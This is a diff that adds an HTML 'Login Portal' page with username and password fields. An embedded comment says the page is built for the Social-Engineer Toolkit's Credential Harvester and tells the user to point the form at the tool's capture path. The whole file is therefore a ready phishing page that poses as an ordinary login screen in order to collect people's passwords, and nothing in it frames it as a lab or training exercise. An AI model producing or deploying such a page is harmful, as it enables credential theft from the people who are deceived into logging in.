@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Portal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 50px;
+    }
+    .login-container {
+      background: #fff;
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    h1 {
+      margin-top: 0;
+      text-align: center;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+    .login-btn {
+      width: 100%;
+      margin-top: 20px;
+      padding: 10px;
+      background: #4285f4;
+      color: #fff;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .login-btn:hover {
+      background: #3367d6;
+    }
+    .message {
+      text-align: center;
+      margin-top: 15px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>Login</h1>
+    <!-- 
+      NOTE: By default, a real site might do: action="login.php"
+      or "process.php" or some server-side script.
+      For SET's Credential Harvester, ensure the form action
+      points to the correct capture path, e.g. "/" or "index.php".
+    -->
+    <form action="/" method="post">
+      <label for="username">Username (Email or ID)</label>
+      <input type="text" id="username" name="username" placeholder="Enter your username" required />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required />
+
+      <button type="submit" class="login-btn">Login</button>
+    </form>
+    <div class="message">
+      <p>Forgot your password? <a href="#">Reset here</a></p>
+    </div>
+  </div>
+</body>
+</html>
